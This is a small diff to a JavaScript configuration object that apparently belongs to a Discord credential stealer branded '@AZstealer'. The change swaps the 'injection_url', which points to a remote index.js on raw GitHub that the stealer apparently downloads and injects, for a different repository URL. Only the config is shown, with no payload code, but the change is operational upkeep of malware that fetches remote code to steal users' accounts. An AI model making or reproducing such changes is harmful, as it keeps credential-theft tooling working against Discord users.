@@ -14,7 +14,7 @@ const config = {
   embed_name: '@AZstealer', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1084103013163073618/1084128859504509030/AZ.png'.replace(/ /g, '%20'), 
   embed_color: 16711680, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/AZbngg/injesdactionsd/main/index.js', 
   /**
    
    **/
